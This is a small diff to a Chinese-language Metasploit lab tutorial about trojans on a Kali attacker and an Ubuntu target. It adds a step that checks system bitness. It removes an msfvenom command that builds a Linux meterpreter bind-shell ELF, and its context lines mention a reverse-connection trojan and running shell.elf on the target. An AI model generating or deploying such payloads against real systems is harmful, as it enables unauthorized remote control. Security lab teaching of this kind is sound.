@@ -11,6 +11,10 @@ keywords: 安全工具,msf
 攻击机：Kali Linux 2020.1 172.16.252.129
 靶机：Ubuntu 16.04 172.16.252.138
 
+##查看当前系统的位数
+
+```[root@localhost ~]# getconf LONG_BIT```
+
 
 ## 生成反向连接木马
 
@@ -79,7 +83,6 @@ chmod a+x shell.elf
 
 生成木马：
 
-msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf > bindtcp.elf
 
 放到靶机上运行：
 
